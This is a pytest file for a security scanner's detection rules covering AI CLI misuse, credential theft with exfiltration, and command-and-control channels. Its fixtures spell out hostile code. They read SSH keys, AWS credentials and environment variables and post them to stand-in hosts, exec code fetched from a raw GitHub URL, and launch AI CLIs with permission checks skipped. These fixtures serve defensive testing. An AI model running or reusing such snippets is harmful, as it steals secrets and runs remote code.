"""39차 — 에이전트·공급망 행위 판정(agent-surface 어댑터): ① AI CLI 오용 ② 수집+전송 ③ C2.

핵심은 **결합**이다 — 하나로는 올리지 않고, 둘 이상이 함께일 때만 차단으로 올린다. fixture 는 합성
도메인(.example)을 쓰고 실제 사고 지표 문구를 그대로 쓰지 않는다(위생 테스트·보안 SW 차단 회피).
"""
from __future__ import annotations

from gvskb.scanner import scan_code
from gvskb.scanners.agent_surface import RULE_C2_CHANNEL, RULE_CLI_ABUSE, RULE_CRED_EXFIL


def _f(code: str, filename: str, rule_id: str | None = None):
    hits = [f for f in scan_code(code, filename=filename).findings if f.engine == "agent-surface"]
    return [h for h in hits if rule_id is None or h.rule_id == rule_id]


# ── ① AI CLI 오용 ────────────────────────────────────────────────────────────

def test_cli_with_permission_skip_is_confirmed_block() -> None:
    hits = _f("subprocess.run(['claude', '-p', task, '--dangerously-skip-permissions'])\n", "a.py", RULE_CLI_ABUSE)
    assert len(hits) == 1 and hits[0].confidence == "confirmed" and hits[0].decision.value == "block"
    assert "claude" in hits[0].evidence


def test_cli_noninteractive_only_is_warn() -> None:
    hits = _f("subprocess.run(['gemini', '-p', q])\n", "a.py", RULE_CLI_ABUSE)
    assert len(hits) == 1 and hits[0].confidence == "likely" and hits[0].decision.value == "warn"


def test_cli_background_raises_evidence_note() -> None:
    hits = _f("const { spawn } = require('child_process');\nspawn('codex', ['exec', p, '--full-auto'], { detached: true, stdio: 'ignore' });\n", "a.js", RULE_CLI_ABUSE)
    assert hits and hits[0].confidence == "confirmed" and "백그라운드" in hits[0].evidence


def test_ordinary_subprocess_is_not_flagged() -> None:
    assert _f("subprocess.run(['python', 'build.py'], check=True)\n", "a.py", RULE_CLI_ABUSE) == []
    assert _f("subprocess.run(['npm', 'run', 'build'])\n", "a.py", RULE_CLI_ABUSE) == []


def test_cli_name_without_spawn_is_not_flagged() -> None:
    # 'claude' 가 문자열에 있지만 프로세스를 띄우지 않으면 대상 아님.
    assert _f("message = 'ask claude for help'\nprint(message)\n", "a.py", RULE_CLI_ABUSE) == []


# ── ② 자격증명 수집 + 전송 ────────────────────────────────────────────────────

def test_collection_plus_transmission_is_block() -> None:
    code = (
        "import os, requests\n"
        "d = open(os.path.expanduser('~/.aws/credentials')).read()\n"
        "d += open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        "d += str(dict(os.environ))\n"
        "requests.post('https://collect.example/x', data=d)\n"
    )
    hits = _f(code, "a.py", RULE_CRED_EXFIL)
    assert len(hits) == 1 and "수집 3종" in hits[0].evidence and "전송" in hits[0].evidence


def test_collection_plus_transmission_plus_staging_is_confirmed() -> None:
    code = (
        "import os, base64, requests\n"
        "blob = open(os.path.expanduser('~/.ssh/id_rsa')).read() + open(os.path.expanduser('~/.aws/credentials')).read() + str(dict(os.environ))\n"
        "payload = base64.b64encode(blob.encode())\n"
        "requests.post('https://x.example/healthcheck', data=payload)\n"
    )
    hits = _f(code, "a.py", RULE_CRED_EXFIL)
    assert hits and hits[0].confidence == "confirmed" and "포장" in hits[0].evidence


def test_collection_only_is_pattern_only_warn() -> None:
    code = (
        "import os\n"
        "a = open(os.path.expanduser('~/.aws/credentials')).read()\n"
        "b = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        "c = open(os.path.expanduser('~/.npmrc')).read()\n"
        "e = open(os.path.expanduser('~/.docker/config.json')).read()\n"
    )
    hits = _f(code, "backup.py", RULE_CRED_EXFIL)
    assert len(hits) == 1 and hits[0].confidence == "pattern-only" and "전송은 확인 안 됨" in hits[0].evidence


def test_transmission_only_is_not_flagged() -> None:
    assert _f("import requests\nrequests.post('https://api.example.com/items', json={'name': name})\n", "a.py", RULE_CRED_EXFIL) == []


def test_two_credential_sources_below_threshold() -> None:
    code = "import os, requests\nd = open(os.path.expanduser('~/.aws/credentials')).read()\nrequests.post('https://x.example/u', data=d)\n"
    assert _f(code, "a.py", RULE_CRED_EXFIL) == []


# ── ③ C2 채널 ────────────────────────────────────────────────────────────────

def test_deaddrop_fetch_then_exec_is_confirmed() -> None:
    hits = _f("import requests\nexec(requests.get('https://raw.githubusercontent.com/x/y/main/p.txt').text)\n", "a.py", RULE_C2_CHANNEL)
    assert len(hits) == 1 and hits[0].confidence == "confirmed" and "dead-drop" in hits[0].evidence


def test_fetching_config_json_is_not_deaddrop() -> None:
    assert _f("import requests\ncfg = requests.get('https://raw.githubusercontent.com/org/repo/main/config.json').json()\n", "a.py", RULE_C2_CHANNEL) == []


def test_webhook_with_transmission_is_likely() -> None:
    hits = _f("import requests\nrequests.post('https://discord.com/api/webhooks/123/abc', json={'content': out})\n", "a.py", RULE_C2_CHANNEL)
    assert len(hits) == 1 and hits[0].confidence == "likely"
    assert "webhook" in hits[0].evidence and "/123/" not in hits[0].evidence   # 토큰 부분은 가린다


def test_blockchain_rpc_is_pattern_only_context_note() -> None:
    hits = _f("from web3 import Web3\nw = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/KEY'))\n", "a.py", RULE_C2_CHANNEL)
    assert len(hits) == 1 and hits[0].confidence == "pattern-only" and "맥락" in hits[0].evidence


def test_plain_source_file_has_no_agent_surface_findings() -> None:
    code = "def add(a, b):\n    return a + b\n\nprint(add(1, 2))\n"
    assert _f(code, "math.py") == []


def test_data_files_are_skipped() -> None:
    # 데이터·마크업은 실행 소스가 아니므로 이 엔진이 보지 않는다.
    assert _f("exec(requests.get('https://raw.githubusercontent.com/x/y/p.txt').text)\n", "notes.md") == []
